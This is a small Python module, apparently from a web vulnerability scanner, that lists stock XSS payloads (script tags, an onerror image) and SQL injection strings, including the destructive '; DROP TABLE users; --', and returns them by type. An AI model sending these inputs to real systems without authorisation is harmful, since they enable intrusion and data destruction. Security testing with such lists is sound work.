# payloads.py

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert('xss')</script>",
    "'\"><img src=x onerror=alert(1)>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' OR 1=1 --",
    "\" OR \"\"=\"",
    "' OR '1'='1' --"
]

def get_payloads(vuln_type):
    if vuln_type == 'xss':
        return XSS_PAYLOADS
    elif vuln_type == 'sqli':
        return SQLI_PAYLOADS
    else:
        return []
